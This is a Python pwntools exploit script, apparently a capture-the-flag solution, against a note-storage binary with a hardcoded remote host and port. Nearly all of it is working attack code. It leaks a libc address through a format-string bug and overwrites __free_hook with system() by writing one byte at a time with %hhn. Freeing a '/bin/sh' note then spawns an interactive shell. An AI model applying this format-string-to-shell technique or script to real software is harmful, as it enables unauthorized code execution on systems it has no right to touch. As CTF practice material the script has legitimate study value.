from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './bin'
HOST = '139.162.160.184'
PORT = 19999

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def store(title, content):
	r.sendlineafter('uit\n', 's')
	r.sendlineafter('title\n', title)
	r.sendlineafter('content\n', content)

def rt(title):
	r.sendlineafter('uit\n', 'r')
	r.sendlineafter('title\n', title)

def update(title, content):
	r.sendlineafter('uit\n', 'u')
	r.sendlineafter('title\n', title)
	r.sendlineafter('content\n', content)

def mod(title, new):
	r.sendlineafter('uit\n', 'm')
	r.sendlineafter('title\n', title)
	r.sendlineafter('title\n', new)

def delete(title):
	r.sendlineafter('uit\n', 'd')
	r.sendlineafter('title\n', title)

def p():
	r.sendlineafter('uit\n', 'p')

r = start()
if args.D:
	debug(r, [0xd95])

# offset14: aaw
store("aaaabbbb", "ccccdddd%45$p")
rt("aaaabbbb")
r.recvuntil('ccccdddd')
leak = int(r.recvuntil('\n', True), 16)
dbg('leak')
base = leak - 0x21b97
fh = base + 0x3ed8e8
system = base + 0x4f4e0
if args.R:
    base = leak - 0x21bf7
    system = base + 0x4f550
    fh = base + 0x3ed8e8

dbg('base')
title = 'aaaabbbb'
for i in range(7):
    old_title = title
    title = 'a'+p64(fh+i).strip('\x00')
    c = (system >> (i*8)) % 0x100
    if c == 0:
        c = 0x100
    payload = 'x' * c
    payload += '%14$hhn'
    store(title, payload)
    # update(title, payload)
    # pause()
    rt(title)

    title = old_title
store("/bin/sh\x00", "//////////////////////bin/sh\x00")
delete("/bin/sh")
r.interactive()
r.close()
